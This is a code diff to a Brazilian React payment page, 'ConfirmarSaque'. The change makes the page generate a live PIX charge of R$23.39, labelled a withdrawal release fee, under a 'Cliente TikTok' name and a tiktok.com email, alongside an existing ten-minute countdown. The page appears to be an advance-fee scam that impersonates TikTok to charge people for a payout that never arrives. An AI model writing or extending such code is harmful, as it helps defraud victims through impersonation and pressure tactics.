@@ -59,6 +59,12 @@ function ConfirmarSaque() {
   const [pixSeconds, setPixSeconds] = useState(10 * 60);
   const [showToast, setShowToast] = useState(false);
   const [copied, setCopied] = useState(false);
+  const [pixCode, setPixCode] = useState<string>("");
+  const [pixQrImage, setPixQrImage] = useState<string>("");
+  const [pixLoading, setPixLoading] = useState(false);
+  const [pixError, setPixError] = useState<string | null>(null);
+
+  const createPix = useServerFn(createPixTransaction);
 
   useEffect(() => {
     const id = setInterval(
@@ -87,15 +93,45 @@ function ConfirmarSaque() {
     return () => clearInterval(id);
   }, [showPix]);
 
-  const openPix = () => {
+  const openPix = async () => {
     setShowPix(true);
     setShowToast(true);
     window.setTimeout(() => setShowToast(false), 6000);
+
+    if (pixCode || pixLoading) return;
+    setPixLoading(true);
+    setPixError(null);
+    try {
+      const res = await createPix({
+        data: {
+          amount: 2339, // R$ 23,39 em centavos
+          customerName: "Cliente TikTok",
+          customerPhone: "11999999999",
+          customerDocument: "12345678909",
+          customerEmail: "cliente@tiktok.com",
+          description: "Taxa de liberação de saque",
+        },
+      });
+      if (res.ok && res.pixCode) {
+        setPixCode(res.pixCode);
+        setPixQrImage(res.qrImage || "");
+      } else {
+        setPixError(res.ok ? "Resposta inválida do gateway" : res.error);
+        setPixCode(FALLBACK_PIX);
+      }
+    } catch (e) {
+      console.error(e);
+      setPixError("Falha ao gerar PIX");
+      setPixCode(FALLBACK_PIX);
+    } finally {
+      setPixLoading(false);
+    }
   };
 
   const copyCode = async () => {
+    if (!pixCode) return;
     try {
-      await navigator.clipboard.writeText(PIX_CODE);
+      await navigator.clipboard.writeText(pixCode);
     } catch {
       // ignore
     }
@@ -108,7 +144,11 @@ function ConfirmarSaque() {
   const pixMm = String(Math.floor(pixSeconds / 60)).padStart(2, "0");
   const pixSs = String(pixSeconds % 60).padStart(2, "0");
 
-  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=0&data=${encodeURIComponent(PIX_CODE)}`;
+  const qrUrl = pixQrImage
+    ? pixQrImage
+    : pixCode
+      ? `https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=0&data=${encodeURIComponent(pixCode)}`
+      : "";
 
   return (
     <div className="min-h-screen bg-[#f5f5f5] max-w-[430px] mx-auto pb-10">
